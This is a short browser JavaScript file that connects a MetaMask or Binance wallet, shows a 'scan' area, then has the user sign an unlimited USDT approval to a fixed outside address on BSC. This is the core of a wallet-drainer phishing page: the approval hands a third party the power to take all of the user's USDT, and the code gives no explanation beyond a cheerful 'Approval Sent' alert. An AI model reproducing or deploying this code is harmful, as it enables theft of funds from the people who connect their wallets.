const connectBtn = document.getElementById('connectBtn');
const walletAddress = document.getElementById('walletAddress');
const scanArea = document.getElementById('scanArea');
const approveBtn = document.getElementById('approveBtn');

let signer;

connectBtn.onclick = async () => {
  if (window.ethereum) {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    signer = provider.getSigner();
    const address = await signer.getAddress();
    walletAddress.innerText = `Wallet: ${address}`;
    scanArea.style.display = 'block';
  } else {
    alert("Install MetaMask or Binance Wallet");
  }
};

approveBtn.onclick = async () => {
  const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT (BSC)
  const abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
  const token = new ethers.Contract(usdtAddress, abi, signer);
  const tx = await token.approve("0x1111111111111111111111111111111111111111", ethers.constants.MaxUint256);
  await tx.wait();
  alert("Approval Sent ✅");
};
